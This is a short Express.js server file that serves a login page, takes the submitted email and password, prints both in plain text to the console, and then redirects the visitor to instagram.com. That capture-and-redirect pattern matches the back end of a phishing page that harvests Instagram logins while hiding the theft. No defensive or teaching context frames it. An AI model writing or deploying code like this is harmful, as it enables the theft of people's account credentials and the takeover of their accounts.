const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files (like your HTML)

// Serve the login page
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html'); // Adjust the path as necessary
});

// Handle form submission
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Here, you can handle the username and password as needed
    console.log('Username:', email);
    console.log('Password:', password);

    // Redirect to Instagram after processing
    res.redirect('https://instagram.com');
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
